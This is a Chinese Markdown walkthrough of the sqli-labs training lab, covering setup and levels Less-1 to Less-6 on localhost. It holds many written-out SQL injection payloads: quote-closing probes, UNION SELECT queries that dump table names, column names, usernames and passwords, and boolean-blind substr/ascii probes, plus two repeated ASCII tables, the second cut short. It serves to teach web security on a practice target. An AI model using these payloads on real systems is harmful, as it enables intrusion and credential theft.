

# sql-labs

+ 参考通关秘籍：[sqli-labs 1-65 通关讲解](https://blog.csdn.net/dreamthe/article/details/123795302?ops_request_misc=%7B%22request%5Fid%22%3A%22170443063816800227461809%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170443063816800227461809&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123795302-null-null.142^v99^control&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)
+ 参考通关秘籍：[ Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关](https://blog.csdn.net/Jayjay___/article/details/132081414?ops_request_misc=%7B%22request%5Fid%22%3A%22171120104816800215076877%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171120104816800215076877&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-132081414-null-null.142^v99^pc_search_result_base4&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)
+ 参考通关秘籍：[Sqli-lab教程-史上最全详解（1-22通关）](https://blog.csdn.net/qq_52364123/article/details/130061490?ops_request_misc=%7B%22request%5Fid%22%3A%22171120104816800215076877%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171120104816800215076877&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-5-130061490-null-null.142^v99^pc_search_result_base4&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)



## sql-labs安装

+ 修改对应文件<code>phpstudy_pro\WWW\sqli-labs\sql-connections\db-creds.inc</code>下的账号及密码

![安装1](./img/安装1.png)



+ 网站所用的<code>php</code>版本设置为<code>php5</code>版本

![安装2](./img/安装2.png)



+ 打开对应的网址，点击下图红框中的语句初始化数据库

![安装3](./img/安装3.png)



+ 出现下面的画面，表示数据库初始化成功

![安装4](./img/安装4.PNG)



## mysql数据结构

~~~ tex
    练习靶场前需了解以下mysql数据库结构，mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。
~~~



## sql-labs通关

### Less-1

![安装5](./img/安装5.PNG)



#### 判断是否存在sql注入

1. 提示输入数字值的ID作为参数，输入<code>?id=1</code>

![Less-1_1](./img/Less-1_1.PNG)



2. 分别注入<code>?id=1</code>、<code>?id=2</code>、<code>?id=3</code>，注入的数字值不同返回的内容也不同所以可以判断注入的内容已经被带入到数据库里查询

![Less-1_1](./img/Less-1_1.PNG)

![Less-1_2](./img/Less-1_2.PNG)



3. 分别注入<code>?id=1'</code>和<code>?id=1'--+</code>, 判断sql语句是否可以拼接，且是字符型还是数字型

![Less-1_3](./img/Less-1_3.png)

![Less-1_4](./img/Less-1_4.png)

![Less-1_5](./img/Less-1_5.png)

![Less-1_6](./img/Less-1_6.png)

+ 可根据上面结果确定是字符型注入且存在sql注入漏洞

+ 该页面存在回显，所以可用联合查询。联合查询就是两个sql语句一起查询，两张表具有相同列数且字段名一样.



#### 联合注入查询

1. 注入<code>?id=1'order by 3 --+</code>和<code>?id=1'order by 4 --+</code> 知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数

~~~ shell
?id=1' order by 3 --+
?id=1' order by 4 --+
~~~

![Less-1_7](./img/Less-1_7.png)

![Less-1_8](./img/Less-1_8.png)

![Less-1_9](./img/Less-1_9.png)

![Less-1_10](./img/Less-1_10.png)



2. 注入<code>?id=-1'union select 1,2,3--+</code>爆显示位，看表格里哪一列在页面显示；可看到第二列和第三列里的数据显示在页面

~~~ shell
?id=-1'union select 1,2,3--+
~~~

![Less-1_12](./img/Less-1_12.png)



3. 注入<code>?id=-1'union select 1,database(),version()--+</code>获取当前数据库名和版本号，这个涉及mysql数据库的一些函数，记得就行

~~~ shell
?id=-1'union select 1,database(),version()--+
~~~

![Less-1_14](./img/Less-1_14.png)

![Less-1_15](./img/Less-1_15.png)



4. 注入<code>?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+</code>爆数据表，

~~~ shell
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

information_schema.tables表示该数据库下的tables表，点表示下一级;where后面是条件，group_concat()是将查询到结果连接起来;如果不用group_concat查询到的只有user;
该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容，也即下面表格user和passwd;
~~~

![Less-1_22](./img/Less-1_22.png)



![Less-1_16](./img/Less-1_16.png)

![Less-1_17](./img/Less-1_17.png)



5. 注入<code>?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+</code>爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来想得到该表下的字段名以及内容。

~~~ shell
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--+

该语句意思是查询information_schema数据库下的columns表里table_name字段是users的所有column_name内容。注意table_name字段不是只存在于tables表也存在于columns表中;其实是表示所有字段对应的表名;
~~~

![Less-1_23](./img/Less-1_23.png)

![Less-1_17](./img/Less-1_17.png)

![Less-1_18](./img/Less-1_18.png)



6. 通过上述操作可得到两敏感字段<code>username</code>和<code>password</code>,接下来注入<code>?id=-1' union select 1,2,group_concat(username ,id , password) from users--+</code>得到字段对应的内容，在中间加了一个id可以隔一下账户和密码。

~~~ shell
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
~~~

![Less-1_19](./img/Less-1_19.png)

![Less-1_20](./img/Less-1_20.png)



### Less-2

+ 第二关地址

~~~ shell
http://localhost/sqli-labs/Less-2/
~~~



+ 和第一关是一样进行判断，当输入单引号或者双引号可看到报错且报错信息看不到数字，所有可猜测sql语句应该是数字型注入。

~~~ 
?id=1 '
?id=1 "
~~~

![Less-2_1](./img/Less-2_1.PNG)

![Less-2_2](./img/Less-2_2.PNG)

![Less-2_3](./img/Less-2_3.PNG)

![Less-2_4](./img/Less-2_4.PNG)



+ 然后基本注入方式和第一关一样，注入语句

~~~ shell
?id=1 order by 3
~~~

![Less-2_12](./img/Less-2_12.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,3
~~~

![Less-2_5](./img/Less-2_5.PNG)

![Less-2_6](./img/Less-2_6.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,database(),version()
~~~

![Less-2_7](./img/Less-2_7.PNG)

![Less-2_8](./img/Less-2_8.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
~~~

![Less-2_9](./img/Less-2_9.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
~~~

![Less-2_10](./img/Less-2_10.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,group_concat(username, id, password) from users
~~~

![Less-2_11](./img/Less-2_11.PNG)



### Less-3

+ 首先注入以下内容判断<code>sql</code>语句类型

~~~ shell
?id=1'
~~~

![Less-3_1](./img/Less-3_1.PNG)

从上面的页面报错信息可推断<code>sql</code>语句是单引号字符型且有括号，所以需要闭合单引号且也需要考虑括号



+ 根据下面的代码构建进行<code>sql</code>注入，后面所有的代码以此为基础进行构造

~~~ shell
?id=1')--+
?id=1') order by 3--+
?id=-1') union select 1,2,3--+
?id=-1') union select 1,database(),version()--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
~~~



+ 注入下面的<code>sql</code>语句：

~~~ shell
?id=1')--+
~~~

![Less-3_2](./img/Less-3_2.PNG)



+ 注入以下语句进行

~~~ shell
?id=1') order by 3--+
~~~

![Less-3_3](./img/Less-3_3.PNG)



+ 注入以下语句

~~~ shell
?id=1') order by 4--+
~~~

![Less-3_4](./img/Less-3_4.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,2,3 --+
~~~

![Less-3_5](./img/Less-3_5.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,version(),database() --+
~~~

![Less-3_6](./img/Less-3_6.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
~~~

![Less-3_7](./img/Less-3_7.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
~~~

![Less-3_8](./img/Less-3_8.PNG)



+ 注入以下语句，成功爆破

~~~ shell
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
~~~

![Less-3_9](./img/Less-3_9.PNG)



### Less-4

+ 根据下面代码<code>sql</code>注入

~~~ shell
?id=1") order by 3--+
?id=-1") union select 1,2,3--+
?id=-1") union select 1,database(),version()--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
~~~



+ 首先注入以下语句

~~~ shell
?id=1
~~~

![Less-4_2](./img/Less-4_2.PNG)



+ 注入以下语句

~~~ shell
?id=1'
~~~

![Less-4_3](./img/Less-4_3.PNG)

没有变化，说明<code>sql</code>语句不是单引号<code>'</code>字符型



+ 注入以下语句

~~~ shell
?id=1"
~~~

![Less-4_4](./img/Less-4_4.PNG)

根据页面报错信息得知<code>sql</code>语句是双引号字符型且有括号



+ 注入以下语句

~~~ shell
?id=1")--+
~~~

![Less-4_5](./img/Less-4_5.PNG)



+ 注入以下语句

~~~ shell
?id=1") order by 3--+
~~~

![Less-4_6](./img/Less-4_6.PNG)



+ 注入以下语句

~~~ shell
?id=1") order by 4--+
~~~

![Less-4_7](./img/Less-4_7.PNG)



+ 注入以下语句

~~~ shell
?id=-1") union select 1,version(),database()--+
~~~

![Less-4_8](./img/Less-4_8.PNG)



+ 注入以下语句

~~~ shell
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security'--+
~~~

![Less-4_9](./img/Less-4_9.PNG)



+ 注入以下语句

~~~ shell
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'--+
~~~

![Less-4_10](./img/Less-4_10.PNG)



+ 最后注入以下语句

~~~ shell
?id=-1") union select 1,2,group_concat(username,id,password) from users--+
~~~

![Less-4_11](./img/Less-4_11.PNG)



### Less-5

+ 注入以下语句

~~~ shell
?id=1
~~~

![Less-5_1](./img/Less-5_1.PNG)



+ 注入一下语句

~~~ shell
?id=1'
~~~

![Less-5_2](./img/Less-5_2.PNG)

由此判断是字符型，且是单引号<code>'</code>闭合。但和前面四关不一样；因为页面虽然有东西，但只对于请求对错出现不一样页面而其余的就没有了。这个时候用联合注入没有用，因为联合注入需要页面有回显位。如果数据不显示只有对错页面显示则可选择布尔盲注。布尔盲注主要用到<code>length()</code>,<code>ascii()</code> ,<code>substr()</code>这三个函数，首先通过length()函数确定长度再通过另外两个函数<code>ascii()</code>以及<code>substr()</code>确定具体字符是什么。布尔盲注相对于联合注入需花费大量时间。



+ 首先确定数据库名字长度，先注入以下语句

~~~ shell
?id=1'and length((select database()))=7--+
#等于号可以换成小于号或者大于号，主要是判断数据库的长度。length()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
~~~

![Less-5_3](./img/Less-5_3.PNG)

该画面是错误画面，可知数据库名长度不是7



再注入以下语句

~~~ shell
?id=1'and length((select database()))=8--+
~~~

![Less-5_4](./img/Less-5_4.PNG)

该页面是正确画面，由此可知数据库名长度是8



最后注入以下语句

~~~ shell
?id=1'and length((select database()))=9--+
~~~

![Less-5_5](./img/Less-5_5.PNG)

该画面是错误画面，可知数据库名长度不是9，由此可确定数据库名长度是8



+ 然后爆破数据库名，先注入以下语句再根据<code>ASCII</code>表确定数据库名第一个字符

~~~ shell
?id=1'and ascii(substr((select database()),1,1))=115--+
#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
~~~

![Less-5_6](./img/Less-5_6.PNG)

由下面的<code>ASCII</code>表可确定数据库名的第一个字符(十进制是115)是<code>s</code>

|  二进制  | 十进制 | 十六进制 |                  字符/缩写                   |                解释                |
| :------: | :----: | :------: | :------------------------------------------: | :--------------------------------: |
| 00000000 |   0    |    00    |                  NUL (NULL)                  |               空字符               |
| 00000001 |   1    |    01    |           SOH (Start Of Headling)            |              标题开始              |
| 00000010 |   2    |    02    |             STX (Start Of Text)              |              正文开始              |
| 00000011 |   3    |    03    |              ETX (End Of Text)               |              正文结束              |
| 00000100 |   4    |    04    |          EOT (End Of Transmission)           |              传输结束              |
| 00000101 |   5    |    05    |                ENQ (Enquiry)                 |                请求                |
| 00000110 |   6    |    06    |              ACK (Acknowledge)               |         回应/响应/收到通知         |
| 00000111 |   7    |    07    |                  BEL (Bell)                  |                响铃                |
| 00001000 |   8    |    08    |                BS (Backspace)                |                退格                |
| 00001001 |   9    |    09    |             HT (Horizontal Tab)              |             水平制表符             |
| 00001010 |   10   |    0A    |          LF/NL(Line Feed/New Line)           |               换行键               |
| 00001011 |   11   |    0B    |              VT (Vertical Tab)               |             垂直制表符             |
| 00001100 |   12   |    0C    |          FF/NP (Form Feed/New Page)          |               换页键               |
| 00001101 |   13   |    0D    |             CR (Carriage Return)             |               回车键               |
| 00001110 |   14   |    0E    |                SO (Shift Out)                |              不用切换              |
| 00001111 |   15   |    0F    |                SI (Shift In)                 |              启用切换              |
| 00010000 |   16   |    10    |            DLE (Data Link Escape)            |            数据链路转义            |
| 00010001 |   17   |    11    |  DC1/XON (Device Control 1/Transmission On)  |         设备控制1/传输开始         |
| 00010010 |   18   |    12    |            DC2 (Device Control 2)            |             设备控制2              |
| 00010011 |   19   |    13    | DC3/XOFF (Device Control 3/Transmission Off) |         设备控制3/传输中断         |
| 00010100 |   20   |    14    |            DC4 (Device Control 4)            |             设备控制4              |
| 00010101 |   21   |    15    |          NAK (Negative Acknowledge)          |     无响应/非正常响应/拒绝接收     |
| 00010110 |   22   |    16    |            SYN (Synchronous Idle)            |              同步空闲              |
| 00010111 |   23   |    17    |       ETB (End of Transmission Block)        |       传输块结束/块传输终止        |
| 00011000 |   24   |    18    |                 CAN (Cancel)                 |                取消                |
| 00011001 |   25   |    19    |              EM (End of Medium)              | 已到介质末端/介质存储已满/介质中断 |
| 00011010 |   26   |    1A    |               SUB (Substitute)               |             替补/替换              |
| 00011011 |   27   |    1B    |                 ESC (Escape)                 |             逃离/取消              |
| 00011100 |   28   |    1C    |             FS (File Separator)              |             文件分割符             |
| 00011101 |   29   |    1D    |             GS (Group Separator)             |          组分隔符/分组符           |
| 00011110 |   30   |    1E    |            RS (Record Separator)             |             记录分离符             |
| 00011111 |   31   |    1F    |             US (Unit Separator)              |             单元分隔符             |
| 00100000 |   32   |    20    |                   (Space)                    |                空格                |
| 00100001 |   33   |    21    |                      !                       |                                    |
| 00100010 |   34   |    22    |                      "                       |                                    |
| 00100011 |   35   |    23    |                      #                       |                                    |
| 00100100 |   36   |    24    |                      $                       |                                    |
| 00100101 |   37   |    25    |                      %                       |                                    |
| 00100110 |   38   |    26    |                      &                       |                                    |
| 00100111 |   39   |    27    |                      '                       |                                    |
| 00101000 |   40   |    28    |                      (                       |                                    |
| 00101001 |   41   |    29    |                      )                       |                                    |
| 00101010 |   42   |    2A    |                      *                       |                                    |
| 00101011 |   43   |    2B    |                      +                       |                                    |
| 00101100 |   44   |    2C    |                      ,                       |                                    |
| 00101101 |   45   |    2D    |                      -                       |                                    |
| 00101110 |   46   |    2E    |                      .                       |                                    |
| 00101111 |   47   |    2F    |                      /                       |                                    |
| 00110000 |   48   |    30    |                      0                       |                                    |
| 00110001 |   49   |    31    |                      1                       |                                    |
| 00110010 |   50   |    32    |                      2                       |                                    |
| 00110011 |   51   |    33    |                      3                       |                                    |
| 00110100 |   52   |    34    |                      4                       |                                    |
| 00110101 |   53   |    35    |                      5                       |                                    |
| 00110110 |   54   |    36    |                      6                       |                                    |
| 00110111 |   55   |    37    |                      7                       |                                    |
| 00111000 |   56   |    38    |                      8                       |                                    |
| 00111001 |   57   |    39    |                      9                       |                                    |
| 00111010 |   58   |    3A    |                      :                       |                                    |
| 00111011 |   59   |    3B    |                      ;                       |                                    |
| 00111100 |   60   |    3C    |                      <                       |                                    |
| 00111101 |   61   |    3D    |                      =                       |                                    |
| 00111110 |   62   |    3E    |                      >                       |                                    |
| 00111111 |   63   |    3F    |                      ?                       |                                    |
| 01000000 |   64   |    40    |                      @                       |                                    |
| 01000001 |   65   |    41    |                      A                       |                                    |
| 01000010 |   66   |    42    |                      B                       |                                    |
| 01000011 |   67   |    43    |                      C                       |                                    |
| 01000100 |   68   |    44    |                      D                       |                                    |
| 01000101 |   69   |    45    |                      E                       |                                    |
| 01000110 |   70   |    46    |                      F                       |                                    |
| 01000111 |   71   |    47    |                      G                       |                                    |
| 01001000 |   72   |    48    |                      H                       |                                    |
| 01001001 |   73   |    49    |                      I                       |                                    |
| 01001010 |   74   |    4A    |                      J                       |                                    |
| 01001011 |   75   |    4B    |                      K                       |                                    |
| 01001100 |   76   |    4C    |                      L                       |                                    |
| 01001101 |   77   |    4D    |                      M                       |                                    |
| 01001110 |   78   |    4E    |                      N                       |                                    |
| 01001111 |   79   |    4F    |                      O                       |                                    |
| 01010000 |   80   |    50    |                      P                       |                                    |
| 01010001 |   81   |    51    |                      Q                       |                                    |
| 01010010 |   82   |    52    |                      R                       |                                    |
| 01010011 |   83   |    53    |                      S                       |                                    |
| 01010100 |   84   |    54    |                      T                       |                                    |
| 01010101 |   85   |    55    |                      U                       |                                    |
| 01010110 |   86   |    56    |                      V                       |                                    |
| 01010111 |   87   |    57    |                      W                       |                                    |
| 01011000 |   88   |    58    |                      X                       |                                    |
| 01011001 |   89   |    59    |                      Y                       |                                    |
| 01011010 |   90   |    5A    |                      Z                       |                                    |
| 01011011 |   91   |    5B    |                      [                       |                                    |
| 01011100 |   92   |    5C    |                      \                       |                                    |
| 01011101 |   93   |    5D    |                      ]                       |                                    |
| 01011110 |   94   |    5E    |                      ^                       |                                    |
| 01011111 |   95   |    5F    |                      _                       |                                    |
| 01100000 |   96   |    60    |                      `                       |                                    |
| 01100001 |   97   |    61    |                      a                       |                                    |
| 01100010 |   98   |    62    |                      b                       |                                    |
| 01100011 |   99   |    63    |                      c                       |                                    |
| 01100100 |  100   |    64    |                      d                       |                                    |
| 01100101 |  101   |    65    |                      e                       |                                    |
| 01100110 |  102   |    66    |                      f                       |                                    |
| 01100111 |  103   |    67    |                      g                       |                                    |
| 01101000 |  104   |    68    |                      h                       |                                    |
| 01101001 |  105   |    69    |                      i                       |                                    |
| 01101010 |  106   |    6A    |                      j                       |                                    |
| 01101011 |  107   |    6B    |                      k                       |                                    |
| 01101100 |  108   |    6C    |                      l                       |                                    |
| 01101101 |  109   |    6D    |                      m                       |                                    |
| 01101110 |  110   |    6E    |                      n                       |                                    |
| 01101111 |  111   |    6F    |                      o                       |                                    |
| 01110000 |  112   |    70    |                      p                       |                                    |
| 01110001 |  113   |    71    |                      q                       |                                    |
| 01110010 |  114   |    72    |                      r                       |                                    |
| 01110011 |  115   |    73    |                      s                       |                                    |
| 01110100 |  116   |    74    |                      t                       |                                    |
| 01110101 |  117   |    75    |                      u                       |                                    |
| 01110110 |  118   |    76    |                      v                       |                                    |
| 01110111 |  119   |    77    |                      w                       |                                    |
| 01111000 |  120   |    78    |                      x                       |                                    |
| 01111001 |  121   |    79    |                      y                       |                                    |
| 01111010 |  122   |    7A    |                      z                       |                                    |
| 01111011 |  123   |    7B    |                      {                       |                                    |
| 01111100 |  124   |    7C    |                      \|                      |                                    |
| 01111101 |  125   |    7D    |                      }                       |                                    |
| 01111110 |  126   |    7E    |                      ~                       |                                    |
| 01111111 |  127   |    7F    |                 DEL (Delete)                 |                删除                |



再注入以下语句判断数据库名的第二个字符

~~~ shell
?id=1'and ascii(substr((select database()),2,1))=101--+
~~~

![Less-5_7](./img/Less-5_7.png)



依次注入不同参数的<code>sql</code>语句爆破数据库名的其他字符串

~~~ shell
?id=1'and ascii(substr((select database()),3,1))=(这里一个十进制数据)--+
?id=1'and ascii(substr((select database()),4,1))=(这里一个十进制数据)--+
?id=1'and ascii(substr((select database()),5,1))=(这里一个十进制数据)--+
?id=1'and ascii(substr((select database()),6,1))=(这里一个十进制数据)--+
?id=1'and ascii(substr((select database()),7,1))=(这里一个十进制数据)--+
?id=1'and ascii(substr((select database()),8,1))=(这里一个十进制数据)--+
~~~



+ 然后是注入以下<code>sql</code>语句爆破数据表的长度

~~~ shell
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+
判断所有表名字符长度。
~~~

![Less-5_8](./img/Less-5_8.PNG)

返回了正确页面，说明数据表名联合长度就是29



+ 同样的注入以下语句根据<code>ASCII</code>表逐个字符地判断联合数据表名是什么

~~~ shell
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+
逐一判断表名
~~~

![Less-5_9](./img/Less-5_9.PNG)

根据<code>ASCII</code>表说明联合数据表名第一个字符是<code>e</code>，其余字符的爆破省略



+ 爆破联合字段名长度

~~~ shell
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20--+
判断所有字段名的长度
~~~

![Less-5_10](./img/Less-5_10.PNG)

返回了正确页面，说明联合字段名长度是20



+ 注入以下语句逐一爆破字段名

~~~ shell
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
逐一判断字段名
~~~

![Less-5_11](./img/Less-5_11.png)

根据返回页面是否正确逐一爆破字段名



+ 注入以下语句判断字段内容长度

~~~ shell
?id=1' and length((select group_concat(username,password) from users))>109--+
判断字段内容长度
~~~

![Less-5_12](./img/Less-5_12.png)



+ 注入以下语句逐一确定字段内容

~~~ shell
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
逐一检测内容。
~~~

![Less-5_13](./img/Less-5_13.png)



### Less-6

+ 注入以下语句

~~~ shell
?id=1
~~~

![Less-6_1](./img/Less-6_1.PNG)



+ 注入以下语句

~~~ shell
?id=1'
~~~

![Less-6_2](./img/Less-6_2.PNG)



+ 再注入以下语句

~~~ shell
?id=1"
~~~

![Less-6_3](./img/Less-6_3.PNG)



+ 注入以下语句闭合<code>sql</code>语句

~~~ shell
?id=1"--+
~~~

![Less-6_4](./img/Less-6_4.PNG)



+ 确认数据库名长度

~~~ shell
?id=1"and length((select database()))>7--+
~~~

![Less-6_5](./img/Less-6_5.PNG)

返回了正确页面，说明数据库名确实是大于7；同理可根据返回的页面正确与否逐步试探出数据库名的长度



+ 注入以下语句判断数据库名的第一个字符

~~~ shell
?id=1"and ascii(substr((select database()),1,1))=115--+
~~~

![Less-6_6](./img/Less-6_6.PNG)

返回了正确页面，经过查<code>ASCII</code>表可知数据库名第一个字符是<code>s</code>

|  二进制  | 十进制 | 十六进制 |                  字符/缩写                   |                解释                |
| :------: | :----: | :------: | :------------------------------------------: | :--------------------------------: |
| 00000000 |   0    |    00    |                  NUL (NULL)                  |               空字符               |
| 00000001 |   1    |    01    |           SOH (Start Of Headling)            |              标题开始              |
| 00000010 |   2    |    02    |             STX (Start Of Text)              |              正文开始              |
| 00000011 |   3    |    03    |              ETX (End Of Text)               |              正文结束              |
| 00000100 |   4    |    04    |          EOT (End Of Transmission)           |              传输结束              |
| 00000101 |   5    |    05    |                ENQ (Enquiry)                 |                请求                |
| 00000110 |   6    |    06    |              ACK (Acknowledge)               |         回应/响应/收到通知         |
| 00000111 |   7    |    07    |                  BEL (Bell)                  |                响铃                |
| 00001000 |   8    |    08    |                BS (Backspace)                |                退格                |
| 00001001 |   9    |    09    |             HT (Horizontal Tab)              |             水平制表符             |
| 00001010 |   10   |    0A    |          LF/NL(Line Feed/New Line)           |               换行键               |
| 00001011 |   11   |    0B    |              VT (Vertical Tab)               |             垂直制表符             |
| 00001100 |   12   |    0C    |          FF/NP (Form Feed/New Page)          |               换页键               |
| 00001101 |   13   |    0D    |             CR (Carriage Return)             |               回车键               |
| 00001110 |   14   |    0E    |                SO (Shift Out)                |              不用切换              |
| 00001111 |   15   |    0F    |                SI (Shift In)                 |              启用切换              |
| 00010000 |   16   |    10    |            DLE (Data Link Escape)            |            数据链路转义            |
| 00010001 |   17   |    11    |  DC1/XON (Device Control 1/Transmission On)  |         设备控制1/传输开始         |
| 00010010 |   18   |    12    |            DC2 (Device Control 2)            |             设备控制2              |
| 00010011 |   19   |    13    | DC3/XOFF (Device Control 3/Transmission Off) |         设备控制3/传输中断         |
| 00010100 |   20   |    14    |            DC4 (Device Control 4)            |             设备控制4              |
| 00010101 |   21   |    15    |          NAK (Negative Acknowledge)          |     无响应/非正常响应/拒绝接收     |
| 00010110 |   22   |    16    |            SYN (Synchronous Idle)            |              同步空闲              |
| 00010111 |   23   |    17    |       ETB (End of Transmission Block)        |       传输块结束/块传输终止        |
| 00011000 |   24   |    18    |                 CAN (Cancel)                 |                取消                |
| 00011001 |   25   |    19    |              EM (End of Medium)              | 已到介质末端/介质存储已满/介质中断 |
| 00011010 |   26   |    1A    |               SUB (Substitute)               |             替补/替换              |
| 00011011 |   27   |    1B    |                 ESC (Escape)                 |             逃离/取消              |
| 00011100 |   28   |    1C    |             FS (File Separator)              |             文件分割符             |
| 00011101 |   29   |    1D    |             GS (Group Separator)             |          组分隔符/分组符           |
| 00011110 |   30   |    1E    |            RS (Record Separator)             |             记录分离符             |
| 00011111 |   31   |    1F    |             US (Unit Separator)              |             单元分隔符             |
| 00100000 |   32   |    20    |                   (Space)                    |                空格                |
| 00100001 |   33   |    21    |                      !                       |                                    |
| 00100010 |   34   |    22    |                      "                       |                                    |
| 00100011 |   35   |    23    |                      #                       |                                    |
| 00100100 |   36   |    24    |                      $                       |                                    |
| 00100101 |   37   |    25    |                      %                       |                                    |
| 00100110 |   38   |    26    |                      &                       |                                    |
| 00100111 |   39   |    27    |                      '                       |                                    |
| 00101000 |   40   |    28    |                      (                       |                                    |
| 00101001 |   41   |    29    |                      )                       |                                    |
| 00101010 |   42   |    2A    |                      *                       |                                    |
| 00101011 |   43   |    2B    |                      +                       |                                    |
| 00101100 |   44   |    2C    |                      ,                       |                                    |
| 00101101 |   45   |    2D    |                      -                       |                                    |
| 00101110 |   46   |    2E    |                      .                       |                                    |
| 00101111 |   47   |    2F    |                      /                       |                                    |
| 00110000 |   48   |    30    |                      0                       |                                    |
| 00110001 |   49   |    31    |                      1                       |                                    |
| 00110010 |   50   |    32    |                      2                       |                                    |
| 00110011 |   51   |    33    |                      3                       |                                    |
| 00110100 |   52   |    34    |                      4                       |                                    |
| 00110101 |   53   |    35    |                      5                       |                                    |
| 00110110 |   54   |    36    |                      6                       |                                    |
| 00110111 |   55   |    37    |                      7                       |                                    |
| 00111000 |   56   |    38    |                      8                       |                                    |
| 00111001 |   57   |    39    |                      9                       |                                    |
| 00111010 |   58   |    3A    |                      :                       |                                    |
| 00111011 |   59   |    3B    |                      ;                       |                                    |
| 00111100 |   60   |    3C    |                      <                       |                                    |
| 00111101 |   61   |    3D    |                      =                       |                                    |
| 00111110 |   62   |    3E    |                      >                       |                                    |
| 00111111 |   63   |    3F    |                      ?                       |                                    |
| 01000000 |   64   |    40    |                      @                       |                                    |
| 01000001 |   65   |    41    |                      A                       |                                    |
| 01000010 |   66   |    42    |                      B                       |                                    |
| 01000011 |   67   |    43    |                      C                       |                                    |
| 01000100 |   68   |    44    |                      D                       |                                    |
| 01000101 |   69   |    45    |                      E                       |                                    |
| 01000110 |   70   |    46    |                      F                       |                                    |
| 01000111 |   71   |    47    |                      G                       |                                    |
| 01001000 |   72   |    48    |                      H                       |                                    |
| 01001001 |   73   |    49    |                      I                       |                                    |
| 01001010 |   74   |    4A    |                      J                       |                                    |
| 01001011 |   75   |    4B    |                      K                       |                                    |
| 01001100 |   76   |    4C    |                      L                       |                                    |
| 01001101 |   77   |    4D    |                      M                       |                                    |
| 01001110 |   78   |    4E    |                      N                       |                                    |
| 01001111 |   79   |    4F    |                      O                       |                                    |
| 01010000 |   80   |    50    |                      P                       |                                    |
| 01010001 |   81   |    51    |                      Q                       |                                    |
| 01010010 |   82   |    52    |                      R                       |                                    |
| 01010011 |   83   |    53    |                      S                       |                                    |
| 01010100 |   84   |    54    |                      T                       |                                    |
| 01010101 |   85   |    55    |                      U                       |                                    |
| 01010110 |   86   |    56    |                      V                       |                                    |
| 01010111 |   87   |    57    |                      W                       |                                    |
| 01011000 |   88   |    58    |                      X                       |                                    |
| 01011001 |   89   |    59    |                      Y                       |                                    |
| 01011010 |   90   |    5A    |                      Z                       |                                    |
| 01011011 |   91   |    5B    |                      [                       |                                    |
| 01011100 |   92   |    5C    |                      \                       |                                    |
| 01011101 |   93   |    5D    |                      ]                       |                                    |
| 01011110 |   94   |    5E    |                      ^                       |                                    |
| 01011111 |   95   |    5F    |                      _                       |                                    |
| 01100000 |   96   |    60    |                      `                       |                                    |
| 01100001 |   97   |    61    |                      a                       |                                    |
| 01100010 |   98   |    62    |                      b                       |                                    |
| 01100011 |   99   |    63    |                      c                       |                                    |
| 01100100 |  100   |    64    |                      d                       |                                    |
| 01100101 |  101   |    65    |                      e                       |                                    |
| 01100110 |  102   |    66    |                      f                       |                                    |
| 01100111 |  103   |    67    |                      g                       |                                    |
| 01101000 |  104   |    68    |                      h                       |                                    |
| 01101001 |  105   |    69    |                      i                       |                                    |
